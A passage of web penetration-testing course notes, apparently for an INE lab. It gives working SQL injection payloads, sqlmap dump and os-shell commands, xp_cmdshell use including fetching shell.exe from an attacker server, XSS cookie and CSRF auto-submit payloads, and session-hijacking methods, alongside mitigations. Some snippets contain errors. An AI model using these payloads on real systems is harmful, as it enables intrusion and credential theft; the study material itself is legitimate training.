process. We have to:  Substitute one of the null fields in our payload with a constant If the constant type used is correct, the query will work If the type is wrong the web app will output an error or misbehave   We found an in-band SQL injection with two fields:  ' UNION SELECT null, null; -- -   So we try to test if the first field is an integer by sending:  ' UNION SELECT 1, null; -- -   If the web app works correctly we can assume that the first field is an integer so we proceed to:  ' UNION SELECT 1, 1; -- -   If we get an error, or the application misbehaves, then the second field is not an integer therefore, we can move on to:  ' UNION SELECT 1, 'a'; -- -          Dumping the Database Content     After finding out the number of columns and their types, its possible to extract information about the database, the server and the database data.   Exploiting Error Based SQL Injections      Are another way to retrieve data from the database. While they do not ask For data directly, they actually use some advanced DBMS functions to trigger an error. The error message contains the information the pentester is aiming For.   Most of the times the error message is reflected on the web app output but, it could also be embedded in an email message or appended to a log file. It depends on how the web app is configured.        Error-based SQL injection is one of the fastest ways to extract data from a database. Its available on DBMS such as Oracle, PostgreSQL and MS SQL server.       MS SQL SERVER   reveals the name of database objects within error messages.   the first piece of information we would like to know is the database version so that we can build our exploits accordingly.   The CAST technique  999999 or 1 in (SELECT TOP 1 CAST (&lt;FIELDNAME&gt; as varchar (4096)) from &lt;TABLENAME&gt; WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;)); -- -   This payload is used as input to the vulnerable parameter of the web app: asp?id=&lt;payload&gt; 99999 is just a bogus value, you can put anything here, provided that its not an id present in the database (we want OR part of the SQL query to be executed, so the first condition should be FALSE) or 1 in = Will trigger the error, we are asking the db to look For integer value 1 within a varchar column, CAST (&lt;FIELDNAME&gt; as varchar (4096)) = We insert the column that we want to dump. &lt;FIELDNAME&gt; can be a SQL function like user_name() or a variable like @@version. WHERE &lt;FIELDNAME&gt; NOT IN (&lt;LIST&gt;) = This part can be ommited/adjusted at our disposal according to which table our searched fieldname value belongs to.   Example:  999999 or 1 in (SELECT TOP 1 CAST (@@version as varchar (4096))) -- -      Knowing the database version is really important because it helps you during the exploitation phase.   Different MS SQL Server versions have different default column names in the master database. We can find information about the structure of the master database on MSDN   MSDN - https://msdn.microsoft.com/en-us/library/ms187837.aspx   Dumping the Database Data     How to extract information from a database by using error-based SQL injections   current database username   current database name   installed databases   the tables into a given database   the columns of a given table   database data   Finding the Current Username  Understand the level of privilege we have, by finding the current database user:  99999 or 1 in (SELECT TOP 1 CAST(user_name() as varchar (4096))) --      user_name() is a MS SQL function which returns the current database user    Finding Readable Databases  To do that we will iterate through the MASTER database to find all the databases that we can read:  99999 or 1 in (SELECT TOP 1 CAST(db_name(0) as varchar (4096))) --      db_name() function accesses the master..sysdatabases table which stores all the databases installed on the server. We can only see the databases that user has rights to.    To enumerate all the databases we just have to increment the db_name() argument:  99999 or 1 in (SELECT TOP 1 CAST(db_name(1) as varchar (4096))) --      Cycle through 1,2,3 and continue until we cannot enumerate any more databases.    Enumerating Database Tables  99999 or 1 in (SELECT TOP 1 CAST(name as varchar (4096))) FROM &lt;database name&gt;..sysobjects WHERE xtype='U' and name NOT IN (&lt;known table list&gt;)); --   // xtype=’U’ = user defined tables // name NOT IN (‘') = name is a column of the **sysobjects** special table. Every time we find a new table we will append it to the NOT IN list. This is needed because the error displays only the first table name.   If a database contains three tables:   HR Customers Products   known table list will:  Be empty in the first payload. ...name NOT IN (' ') will work Contain 'HR' at the second step Contain 'HR', 'Customer', 'Products' at the last step      After retrieving the tables of a database, its also possible to recover the columns of each table. This is the schema of the database and we can retrieve it by using the following payload template:   99999 or 1 in (SELECT TOP 1 CAST (&lt;db name&gt;..syscolumns.name as varchar(4096) FROM &lt;db name&gt;..syscolumns,&lt;db name&gt;..sysobjects WHERE &lt;db name&gt;..syscolumns.id=&lt;db name&gt;..sysobjects.id AND &lt;db name&gt;..sysobjects.name=&lt;table name&gt; AND &lt;db name&gt;..syscolumns.name NOT IN (&lt;known column list&gt;));   Dumping Data     After enumerating the databases and their schemas, we can proceed to the data dumping phase.   You can dump data with the same technique we have seen For schema enumeration:  99999 or 1 in (SELECT TOP 1 CAST (&lt;column name&gt; as varchar(4096) FROM &lt;dbname&gt;..&lt;table name&gt; WHERE &lt;column name&gt; NOT IN (&lt;retrieved data list&gt;)); -- -   id  To retrieve the id values, you can use the following payload:  9999 OR 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar(64) FROM cms..users WHERE id NOT IN (' '); -- -   // %2bchar = +@ // This ensures that the selected id has data type varchar thus making the cast error possible   Then we can proceed with the usual method. We filter out the id we already have:  9999 OR 1 IN (SELECT TOP 1 CAST(id as varchar) %2bchar(64) FROM cms..users WHERE id NOT IN ('1'); -- -   usernames  After extracting all the ids, we can use this information to extract all the username:  9999 OR 1 IN (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id =1; -- -   // No string concatenation is needed here, because username data type is varchar. Using the ids, let us correlate usernames and passwords by retrieving the password of a specific username.   passwords  We can retrieve password by using the same payload:  9999 OR 1 IN (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1; -- -   Or even concatenate the username and the password:  9999 OR 1 IN (SELECT username%2bchar(64)%2bpassword FROM cms..users WHERE id=1); -- -   MySQL error-based SQLi Exploitation  To exploit error-based SQL injection on MySQL, we will use the group by statement:  select 1,2 UNION select count(*), concat(version(), floor(rand(0)*2)) as x from information_schema.tables group by x;   PostgreSQL Error-based SQLi Exploitation  To exploit SQLi on a web app using postgreeSQL, you have to leverage the cast technique we saw For MSSQL.  select cast(version() as numeric);   Or the tables, by iterating over the information_schema special database:  select cast ((select table_name from information_schema.tables limit 1 offset 0) as numeric); select cast ((select table_name from information_schema.tables limit 1 offset 1) as numeric); select cast ((select table_name from information_schema.tables limit 1 offset 2) as numeric);   Developing Error-based SQLi Payloads     You have to study how different DBMS functions work.   You can refer to the following cheat sheets by PentestMonkey to craft your payloads:   → MSSQL = http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet   → MySQL = http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet   → Postgre = http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet   Exploiting BLIND SQL injections     its a inference methodology you can use to extract database schemas and data.   Once pentester find a way to tell when a condition is true or false, they can ask the database some simple true/false questions, like:   Is the first letter of the username **a**? Does this database contain three tables? etc  Detecting current User     user() returns the same of the user currently using the database   substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.   Functions can be used as argument of other functions.   Moreover, SQL allows you to test the output of a function in a true/false condition  select substring(user(), 1, 1) = 'r';   // returns 1 if true, 0 if false   ' or substr(user(), 1, 1) ='a ' or substr(user(), 1, 1) ='b etc   When we find the first letter, we can move to the second:  ' or substr(user(), 2, 1) ='a  ' or substr(user(), 2, 1) ='b   Scripting Blind SQLi Data Dump  9999 or SUBTRING(user_name(),1,1) = 'a'; -- 9999 or SUBTRING(user_name(),1,1) = 'b'; -- // etc   Optimized Blind SQL injections  This means that you need to be able to understand if the character you are trying to guess is:  [A-Z] [a-z] [0-9]   First:  ASCII(UPPER(SUBSTRING((&lt;query&gt;),&lt;position&gt;, 1)))=ASCII(SUBSTRING((&lt;query&gt;,&lt;position&gt;, 1)) // notes if the test is FALSE or TRUE  ASCII(LOWER(SUBSTRING((&lt;query&gt;),&lt;position&gt;, 1)))=ASCII(SUBSTRING((&lt;query&gt;,&lt;position&gt;, 1)) // the same with lowercase      if the first query returns TRUE and the second FALSE, the character is uppercase   if the first is false and the second is true,.the character is lowercase   if both queries are TRUE our character is either a number or a symbol   in this case we will iterate through [0-9] and symbols only   Time Based Blind SQL Injection     Another Blind SQL Injection technique is called Time-Based Blind Sql injection. Time is used to infer a TRUE condition from a FALSE condition.   This SQL syntax is used:  %SQL condition% wait For delay '0:0:5'      if the SQL condition is TRUE the DBMS will delay For 5 seconds   Examples:  Check if we are 'sa' (MS SQL Server): if (select user) = 'sa' waitfor delay '0:0:5'  Guess a database value (MySQL): IF EXISTS (SELECT * FROM users WHERE username='armando') BENCHMARK (1000000,MD5(1))      if the IF clause yields TRUE (thus consuming time).   you should be careful with the first argument of BENCHMARK(). It may seriously affect the server load   SQLMap     Its a open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.   sqlmap -u &lt;URL&gt; -p &lt;injection parameter&gt; [options]   // SQLMap need to know the vulnerable URL and the parameter to test For a SQLi.   To exploit the union-based in-band SQLi:  sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U   // This tells SQLMap to test the id parameter of the GET request For view.php. Moreover it tells SQLMap to use a UNION based SQL injection technique.   If you have to exploit a POST parameter you have to use:  sqlmap -u &lt;URL&gt; --data=&lt;POST string&gt; -p parameter [options]   // you can write the POST string by yourself or copy it from a request intercepted with Burp   Another way to use SQLMap is by saving a request intercepted with Burp to a file  Burp &gt; Copy to File sqlmap -r &lt;request file&gt; -p parameter [options] - you can also copy the POST string from a request intercepted by Burp   Extracting the Database Banner  By using the ‘–banner’ switch you can grab the database banner:  sqlmap -u &lt;target&gt; --banner &lt;other options&gt;   Information Gathering  List the users of the database:  sqlmap -u &lt;target&gt; --users &lt;others options&gt;   Check if the web app database user is a database administrator:  sqlmap -u &lt;target&gt; --is-dba &lt;other options&gt;   List all available databases:  sqlmap -u &lt;target&gt; --dbs &lt;other options&gt;   Extracting the Schema  After that you choose a database by using the -D switch and list its tables:  sqlmap -u &lt;target&gt; -D &lt;database&gt; --tables &lt;other options&gt;   List one or more tables and list their columns:  sqlmap -u &lt;target&gt; -D &lt;database&gt; -T &lt;tables, comma separeted list&gt; --columns &lt;other options&gt;   Finally, dump the columns you need:  sqlmap -u &lt;target&gt; -D &lt;database&gt; -T &lt;tables&gt; -C &lt;columns list&gt; --dump &lt;other options&gt;   SQLMap Advanced Usage     Not all web app and exploitation scenarios are the same. Because of that, SQLMap provides you with some useful command line switches that help fine tune the following:   The DBMS you are attacking Injection point Payload aggressiveness Exploitation speed and load on the clients infrastructure   Forcing the DBMS  SQLMap is able to detect the DBMS behind a web application automatically. If it fails, you can specify the DBMS by hand:  sqlmap --dbms=&lt;DBMS&gt; ...   The DBMS you can specify are:  MySQL Oracle PostgreSQL Microsoft SQL Server Microsoft Access SQLite Firebird Sybase SAP MaxDB DB2      specifying the DBMS also helps to shorten the detection phase and its detectability. Beware that specifying the wrong DBMS means sending useless payloads to the target application.    Fine Tuning the Payloads     Web app sometime change their output in a way that SQLMap cannot figure it out. This makes blind exploitation impossible. To get around this, you can use the –string and –not-string command line switches:   Append to --string a string which is always be present in TRUE output pages Append to --not-string a string which is always be present in FALSE output pages.   Example:  sqlmap -u 'http://localhost/ecommerce.php?id=1' --string \"nokia\" &lt;other switches&gt;      Sometimes a SQLi payload is inserted in a structured POST parameter like a JSON or you need to insert some characters to make the query syntactically correct.   You can do that by using the –prefix and –suffix command line switches   If injected payloads need to end with:   ')); it looks like this:'   sqlmap -u &lt;URL&gt; --suffix \"'));\" &lt;others switches&gt;   Aggressiveness and Load          By using the –level command line switch, SQLMap is able to test:   The Cookie header - values 2   The User-Agent and Referrer - headers 3   The Host - header 5            By default Level 1 SQLMap tests GET and POST parameters            The -p switch bypasses the Level. This means that by manually setting the parameter to test, you can perform a more accurate, stealthy and in-depth exploitation.          [+] Note Permanently injection some heavy time-based SQLs on a popular page on a web site can: Make the page load extremely slow Eat-up all the CPU resources available For that site       The –risk parameter lets you fine-tune how dangerous your injections can be. Use this parameter only when needed after carefully studying the web application you are testing!   Lauching SQLMap with both a high level and risk and letting it automatically test For injection points is very unprofessional and will probably generate issues to your clients infrastructure!   Risk levels:  1 - Default - Innocuous injections 2 - Enables heavy time-based injections 3 - Enables OR-based injections      using the 3rd level on UPDATE queries would update all the rows in a table    SQLI can take a long time to dump data. This times can be reduced by using persistent connection to the target by using the –keep-alive command line switch:     → sqlmap =u &lt;target&gt; --keep-alive &lt;other commands&gt;   You can reduce the dumping phase time by using parallel threads. Use the –threads command line switch with an argument ranging from 1 to 10:   Example: Using 7 threads to exploit a blind injection:  sqlmap -u &lt;target&gt; --technique=B --threads 7 &lt;other commands&gt;   Mitigation Strategies      SQLi vulnerabilities are input validation vulnerabilties and can be prevented by enforcing input validation on any user-controlled parameter.   Prepared Statements     web app which use SQL, can separate the code from instruction using bind variables in SQL. Implementing prepared statements could be a long term objective as it implies code regactoring of nearly every SQL interaction in the web app.   Example in PHP:  $sql = \"INSERT INTO table VALUES (?,?,?,?)\"; $sql_statement = $mysqli-&gt;prepare($sql) $sql_statement-&gt;bind_param('dsss', $user_id, $name, $address, $email); $user_id=$_POST['user_id']; $name = $_POST['name']; $address = $_POST['address']; $email = $_POST['email']; $sql_statement-&gt;execute();   Type Casting  A short term method to prevent some SQLs is to perform type casting For some data types, perhaps most notably integer numbers:  $user_id = (int) $user_id;   Input Validation     it can sometimes protect your application if a SQL injection vulnerablity is somehow introduced by accident   White-list based validation example written in PHP. Only letters, spaces and dashes are allowed.  if (!preg_match(|'^[a-z\\s-]$|i', $name)) { die('Please enter a valid name'); }   From SQLi to Server Takeover     Since we will ned high privileges, our first testing objectives is to retrieve the sa users password.   Once we have the SHA-1 hash of the password, we can crack it and access the database in the same manner as a legitimate database administrator.   There are two queries you can run to retrieve the username and the password hash:  SELECT name, password FROM master..sysxlogins // MSSQL Server 2000 SELECT name, password_hash FROM master.sys.sql_logins // MSSQL Server &gt;=2005   xp_cmdshell     The sa user has complete control over the DBMS, the databases it contains and the advanced features.   Most of the functionalities useful For a pentester exploit the xp_cmdshell stored procedure.   EXEC master..xp_cmdshell '&lt;command&gt;'    // xp_cmdshell is not enabled by default and requires 'sa' privileges   To enable we have to issue the following commands:  EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;   To disable:  EXEC sp_configure 'xp_cmdshell', 0; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;   Internal Network Host Enumeration     By using xp_cmdshell we can launch some commands on the database server.   We can combine this with some other SQL Server features to mount a host enumeration utility via SQL injections.   Example using a PING:  EXEC master.dbo.xp_cmdshell 'ping &lt;target IP address&gt;'   // we can use the query execution time to infer the ping result. // by default the MS ping sends 4 ICMP echo requests. This means that pinging a live host takes about 5 to 8 seconds, while pinging a bogus IP address takes from 20 to 30 seconds.   Port Scanning     OPENROWSET is a SQL server method you can use to access the tables of a remote server. It needs the IP address and the port to connect to.   This can be exploited to create a port scanner.  SELECT * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=something;Network=DBMSSOCN;Address=&lt;target ip&gt;, &lt;target port&gt;; timeout=&lt;connection timeout in seconds&gt;', 'select 1')--      if the port is closed = SQL Server does not exist or access denied   if the port is open = General network error / Check your network documentation   if error are hidden and the port is closed the connection will timeout according to the  value.   Reading the File System  EXEC master..xp_cmdshell 'dir &lt;target directory&gt;'  // that will return the directory listing of    To read the result, we can save the output of the command on a web accessible folder:  EXEC master..xp_cmdshell 'dir c:\\ &gt; C&gt;\\inetpub\\wwwroot\\site\\dir.txt'--   // then browser to dir.txt at the URL http://site.com/dir.txt   Or we can read a file on the server and then put its content into a table. Then we can extract the table via SQLi like any other table:  CREATE TABLE filecontent (line varchar(8000)); BULK INSERT filecontent FROM '&lt;target file&gt;'; // drop the table after extracting it // DROP TABLE filecontent;   Uploading Files  Uploading a file involves two steps:  1. We have to insert the file into a table in a MS SQL database under our control \tCREATE TABLE HelperTable (file text) \tBULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW') 2. We force the target DB server to retrieve it from our server \tEXEC xp_cmdshell 'bcp \"SELECT * FROM HelperTable\" queryout shell.exe -c -Craw -S &lt;our server address&gt; -U &lt;our server username&gt; -P &lt;our server password&gt;'  \t// the victim server will connect to our SQL server, read the exe file from the table and recreate it remotely.   Storing Command Results into a Temporary Table  Create a temporary table to hold the stored procedure output  create table temptable (id into not null identity (1,1), output nvarchar(4096) null);--      the id column will help us to access different command outputs while the output column will contain the actual command results.    Crafting the argument For xp_cmdshell: // we need to convert the command string of the command we want to run into an ASCII representation. example: *dir c:* &gt; we have to convert every character to it HEX ASCII representation.                  64       d                 69       i                 72       r                 20       ” “                 63       c                 3a       :                 4c       |              then insert a double zero after every character of the string.    Executing xp_cmdshell: // now we have to create a variable the command string we have just created and then we pass it to xp_cmdshell   declare @t nvarchar(4096) set @t=0x640069007200200063003a005c00 insert into temptable (output) EXEC master.dbo.xp_cmdshell @t;   Reading the results: // We can use any form of data-dumping   Final cleanup: // delete the temporary table   DROP TABLE temptable;   Advanced MySQL exploitation     MySQL also provides some advanced features.   https://dev.mysql.com/doc/refman/5.1/en/privileges-provided.html#priv_file   IF a application connects to its database as root, exploiting a SQL injection will lead not only to data compromise, but also to full server takeover.   Read Files  SELECT LOAD_FILE('&lt;text file path&gt;');   To read a binary file:  SELECT HEX(LOAD_FILE('&lt;text file path&gt;'));   // with this method, you can convert any binary file to a long hex string that you can use to steal any data from the server.   Its also possible to PARSE the content of a file and tell MySQL how to distinguish one record from another:  CREATE TABLE temptable (output longtext); LOAD DATA INFILE '/etc/passwd' INTO TABLE temptable FIELDS TERMINATED BY '\\n' (output);   Uploading Files  This can be used to download huge query results via the web app and to upload pentester supplied data to the server.  SELECT &lt;fields&gt; FROM &lt;table&gt; INTO DUMPFILE '&lt;output file path&gt;';      You can load a binary file into a table via SQL injection, by converting it into an hex-string   Example= to upload /bin/ls, you have to create a file on your local machine and then load it into a table:  SELECT HEX(LOAD_FILE('/bin/ls')) INTO DUMPFILE '/tmp/ls.dmp'; LOAD DATA INFILE '/tmp/ls.dmp' INTO TABLE mytable FIELDS TERMINATED BY 'somerandom' LINES TERMINATED BY 'otherrnD' (data);   You can test by using INTO DUMPFILE to recreate the same file:  SELECT UNHEX (data) FROM mytable INTO DUMPFILE '/tmp/ls.test'; sha256sum /tmp/ls.test /bin/ls   // if everything work as expected you can upload the file content to a table on the victim server. // you will need to split the DUMPFILE you created into chunks of 1024 bytes and then insert them into a table field.   First you have to perform an insert with the first chunk. Next, you have to update the field by adding the other chunks:  INSERT INTO victimtable(field) VALUES (&lt;values&gt;); UPDATE victimtable SET field=CONCAT(data, &lt;values&gt;); UPDATE victimtable SET field=CONCAT(data, &lt;values&gt;); UPDATE ... etc   Finally, you can write the file on the target system by executing:  SELECT &lt;victim field&gt; FROM &lt;victim table&gt; WHERE &lt;options conditions&gt; INTO DUMPFILE '&lt;output path&gt;';   Executing Shell Commands     User Defined Functions   →  UDF = https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html   By using EDF its possible to create two functions:  sys_eval(&lt;command&gt;) - which returns the standard output of the chosen command sys_exec(&lt;command&gt;) - that returns the command exit status      To use those functions, you have to upload: in Linux = a Shared object (SO) in Windows = a Dynamic-link library (DLL)    → Source code of the functions: http://www.mysqludf.org/  → Compiled versions: https://github.com/sqlmapproject/sqlmap/tree/master/udf/mysql   After uploading the files to the target system, running a command is just a matter if performing a SELECT:  SELECT sys_eval('&lt;command&gt;'); SELECT sys_exec('&lt;command&gt;');      This can be easily accomplished by using the SQLMap takeover features –os-cmd and –os-shell    Lab Environment  &lt;h1&gt;localhost&lt;/h1&gt;   Inspect the DOM elements of the resulting page (press CTRL+SHIFT+I)   &lt;script&gt;alert(\"testing-xss\")&lt;/script&gt;   &lt;script&gt;alert(document.cookie)&lt;/script&gt; \tPHPSESSID=tpp66es56i5e4hgmrbtd75vqi6; showhints=1   innerHTML = DOM command:  you\";}catch(e){}alert(\"dom-xss-payload\");try{\"   sql injection:  user: '' = sql error ' or '1'='1  Sqlmap:  sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username   sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username --dbs   sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username --dbs -D mutillidae --tables   sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username --dbs -D mutillidae --tables -T accounts --columns   sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username --dbs -D mutillidae --tables -T accounts -C username,password,is_admin --dump      Obtain an OS shell on the target server.    Use the following command:  --os-shell   sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username --technique=B --level=5 --risk=2 --retries=10 --timeout 120   Use the following command to exploit SQLi using the boolean-based blind technique:  --technique B   Copy the payload to the vulnerable field, in this case username:  Payload = page=user-info.php&amp;username=test' AND 7329=(SELECT (CASE WHEN (7329=7329) THEN 7329 ELSE (SELECT 1951 UNION SELECT 7004) END))-- -&amp;password=test&amp;user-info-php-submit-button=View Account Details      if you are sending through burp, URL encode first       Exploit SQLi vulnerability using the time-based blind technique using the sqlmap tool.   Use the following command to exploit SQLi using the time-based blind technique:  --technique T   sqlmap -u \"http://demo.ine.local/index.php?page=user-info.php&amp;username=test&amp;password=test&amp;user-info-php-submit-button=View+Account+Details\" --cookie \"PHPSESSID=gotu3qj422pmksv4ubtmjbmmo5; showhints=1\" -p username --technique=T --level=5 --risk=2 --retries=10 --timeout 120      ps: moreover sqlmap flags here  https://github.com/sqlmapproject/sqlmap/wiki/Usage       Copy that payload and place it in the username parameter (in the Burp Repeater window):   Time-based Blind SQLi Payload:  page=user-info.php&amp;username=test' AND (SELECT 8505 FROM (SELECT(SLEEP(5)))XglP)-- CkEz&amp;password=test&amp;user-info-php-submit-button=View Account Details      CSRF Notice the : csrf-token parameter is empty - there is no CSRF protection!      Therefore, if an attacker-controlled page is opened, it would register a new user with the victim users session without requiring any user-interaction!    Save the following HTML page as bank-login.html:   HTML Code:   &lt;html&gt;     &lt;head&gt;         &lt;title&gt;Bank Login Page&lt;/title&gt;     &lt;/head&gt;     &lt;body&gt;         &lt;div align=\"center\"&gt;             &lt;h1&gt;Bank Login Page&lt;/h1&gt;             &lt;form&gt;                 &lt;input type=\"text\" name=\"username\" value=\"\" placeholder=\"Username\"&gt;&lt;br /&gt;                 &lt;input type=\"password\" name=\"password\" value=\"\" placeholder=\"Password\"&gt;&lt;br /&gt;                 &lt;input type=\"submit\" value=\"Login\" /&gt;             &lt;/form&gt;         &lt;/div&gt;         &lt;!-- Form target frame to avoid redirection --&gt;         &lt;iframe id=\"iframe\" name=\"my_iframe\" style=\"position: absolute;width:0;height:0;border:0;\"&gt;&lt;/iframe&gt;         &lt;!-- CSRF - Register new user --&gt;         &lt;form name=\"csrf\" id=\"csrf\" target=\"my_iframe\" action=\"http://demo.ine.local/index.php?page=register.php\" method=\"POST\"&gt;             &lt;input type=\"hidden\" name=\"csrf-token\" value=\"\"&gt;             &lt;input type=\"hidden\" name=\"username\" value=\"root\"&gt;             &lt;input type=\"hidden\" name=\"password\" value=\"root_passwd\"&gt;             &lt;input type=\"hidden\" name=\"confirm_password\" value=\"root_passwd\"&gt;             &lt;input type=\"hidden\" name=\"my_signature\" value=\"nothing interesting\"&gt;             &lt;input type=\"hidden\" name=\"register-php-submit-button\" value=\"Create Account\"&gt;         &lt;/form&gt;         &lt;!-- Send POST request --&gt;         &lt;script&gt;             document.csrf.submit();         &lt;/script&gt;     &lt;/body&gt; &lt;/html&gt;       The above code creates a simple login form and a hidden form that sends the account creation request once this page loads.   So a victim just needs to open this page and the rest follows.   open the page in a python server in the attacker kali machine enter a fake username and password grab with burp      [!Opinion] Very weak and boring lab    Other Common Web Attacks   Session Attacks  A stronger ID is:  Valid For only a single session Time limited Purely random (thus unpredictable)      Do not store session token in:   URL: The session token will be leaked to external sites through the referrer header and in the user browser history   HTML: The session token could be cached in the browser or intermediate proxies   HTML5 Web Storage:  Localstorage: will last until its explicitly deleted, so this may make session last too long Sessionstorage: is only destroyed when the browser is closed. There may be users that do not close their browser For a long time.   Session Hijacking     Exploitation of a valid session assigned to a user.   If the session identified is weakly generated, the attacker might be able to brute-force the session ID.   Remember that in most web app, sessions IDs are typically carried back and forth between client web browser and server using:  Cookies URLs   Attack  A session hijack attack can happen by:  Exploiting an existing XSS vuln Packet Sniffing Gaining direct access to server filesystem where sessions are stored Finding session IDs in logs or browser history *sessions carried through the URL   via XSS  You can perform this attack when all the following conditions occur:  An XSS vuln exists and you can execute your own payload through it Session IDs sent through cookies on each HTTP request  Cookies are readable by JavaScript   Preventing Session Hijacking via XSS     In order to prevent cookie stealing through XSS, making cookie inaccessible via JavaScript is necessary. This is as simple as creating the cookie with the HTTPONLY flag enabled.   If you are using server-side script libraries to manage sessions:   PHP  Before any session-related operation is performed, you should run the following instruction:  init_set('session.cookie_httponly','1');      When session_start() is invoked, if a valid session does not already exist, a new one will be created. A cookie with the name PHPSESSID and HttpOnly flag enabled will be sent to the web client.   Java  Servlet 3.0 (Java EE 6) introduced a standard way to configure HttpOnly attribute For the session cookie; This can be accomplished by applying the following configuration in web.xml:  init_set('session.cookie_httponly','1');      In Tomcat 6, the flag useHttpOnly=True in context.xml forces this behavior For applications, including Tomcat-Based frameworks like JBoss.   If you want to manage session cookies directly, you can do so from the Java cookie interface.   Sun JavaEE supports the HttpOnly flag in the cookie interface and For session cookies (JSESSIONID), after version 6 (Servlet class V3)   String sessionid=request.getSession().getId(); response.setHeader(\"SET-COOKIE\", \"JSESSIONID=\" + sessionid + \"HttpOnly\");      The methods setHttpOnly and isHttpOnly can be used to set and check For HttpOnly value in cookies. For older versions, the workaround is to rewrite the JSESSIONID value, setting it as a custom header;   →  moreover: https://www.owasp.org/index.php/HttpOnly   .NET  By default, starting from .NET 2.0, the framework sets the HttpOnly attribute For both:  SessionIDs Forms Authentication cookie   Session Hijacking via Packet Sniffing     This is unlikely to happen For a remote attacker, but its feasible on a local network if both the attacker and victim are present.        If HTTP traffic is encrypted through IPSEC or SSL, the session token will be harder (if not impossible) to obtain       This attack requires the following two conditions to be true:   Victim HTTP traffic can be sniffed (LAN or compromised gateway)   HTTP traffic must be unencrypted (No SSL)   Web Server     Generally speaking, session data is stored in either the web servers file system or in memory. If an attacker obtains full access to the web server, the malicious user can steal the session data of all users - not just the session identifiers.   PHP     Session data will be stored within the folder specified by the php.ini entry session.save_path. The attacker will focus on files named sess_(sessionID).   In a real world example, we could find the following entried:  sess_7o410kk5bt14e4qlok8r26tn12   If you want to hijack the user session related to the first entry, you would install a new cookie in your web browser using these values:  cookie name: PHPSESSID cookie value: ta9ikqska407387itjf157624      The attack is very simple however, its critical that the attacker has access to the webserver file system.    Java     Tomcat provides two standard implementations of a Session Manager   The default stores active session, while the second stored active session that have been swapped. The file name of the default session data is SESSION.ser.   →  moreover: http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html   .NET          ASp.NET can store session data in three different locations:                       ASP.NET runtime process aspnet_wp.exe  // if the web server crashes then all session data will be lost                        A dedicated Windows Service  // If the web server crashes then session data will persist but if the machine crashes then the session data will be lost                        Microsoft SQL Server database // session data will persist regardless of crashes                      Unlike PHP technology, .NET session data cannot be read directly from files on web server.    Session Fixation Attack     The attacker fixates a sessionID and forces the victim to use it (after the user logs in). The attack can be divided into two places:            the attacker obtains a valid sessionID       The attacker forces the victim to use this sessionID to establish a personal session with web server.              In contract to the previous attack, the attacker is not interested in stealing the sessionID; He instead creates one and forces the victim to use it.    Step 1 : Set the sessionID     Most web app are designed to start a new session the first time a user visits a website regardless of whether or not they are authenticated.        Although this is not a vuln, it could turn into Session Fixation if:       The session identifier remains the same after a successfully reserved operation (example: login)        The session identifier can be propagated (example: via URL or JavaScript)       Some web app could permit the attacker to create and use his own personal sessionID; is this case, you do not care about obtaining a valid sessionID because you can simply create one.   If a web app releases a valid sessionID only after a reserved operation (login), Session Fixation is only possible if the attacker is also a member of the vulnerable website.   In this case, the attacker can use Session Fixation to impersonate another user.   Step 2 : Force the victim     This happens when the sessionID is embedded in the URL rather than inside the cookie header; an attacker can simply send a malicious link to the victim, which will set the new, and known, sessionID.   A web app vuln to session Fixation will recycle this sessionID and will bind the session to the victim.   Preventing Session Fixation     Generate a new sessionID after any authenticated operation is performed.   PHP     The following method will replace the current sessionID with a new one and will retain the current session information. The old session cookie will be automatically invalidated and a new one will be sent.   session_regenerate_id(true);   → moreover: http://php.net/manual/en/function.session-regenerate-id.php   Java     The invalidation of the current session and the creation of a new one do not exist.   You should use the following:  oldHttpSession=HttpServletRequest.getSession(); oldHttpSession.invalidate(); newHttpSession=HttpServletRequest.getSession(true);   // the old session cookie will be automatically invalidated and a new one will be sent. // moreover: http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html   .NET     its complicated because of the tricky API. The .NET framework provides the HttpSessionState.Abandon() method to manage session removal.   Although the session is invalidated, the web application will continue using the same SessionID within the cookie header, so Session Fixation could still occur.   Session.Abandon(); Response.Cookies.Add(new HttpCookie(\"ASP.NET_SessionId\", \"\"));   → moreover: https://msdn.microsoft.com/en-us/library/ms524310(v=vs.90).aspx   Cross Site Request Forgery     CSRF or XSRF (aka Sea-Surf attacks);   Automated scanning tools cannot easily find these vulnerabilties.   CSRF exploits a feature of internet browsing, 